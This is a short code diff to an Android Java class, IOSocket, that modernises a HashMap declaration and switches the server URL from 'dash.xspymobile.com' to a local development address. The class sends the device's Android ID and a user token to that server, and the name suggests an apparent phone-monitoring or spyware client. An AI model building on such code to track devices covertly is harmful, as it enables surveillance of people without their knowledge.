@@ -22,7 +22,7 @@ public class IOSocket {
 
         String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
 
-        Map<String, String> headers = new HashMap<String, String>();
+        Map<String, String> headers = new HashMap<>();
         headers.put("device-id", deviceID);
         headers.put("user-token", key);
 
@@ -38,8 +38,8 @@ public class IOSocket {
     }
 
     public static String getUrl() {
-        return "https://dash.xspymobile.com";
-       // return "http://192.168.0.2:5000";
+       // return "https://dash.xspymobile.com";
+        return "http://192.168.0.2:5000";
     }
 
     public void send(String method, Object... args) {
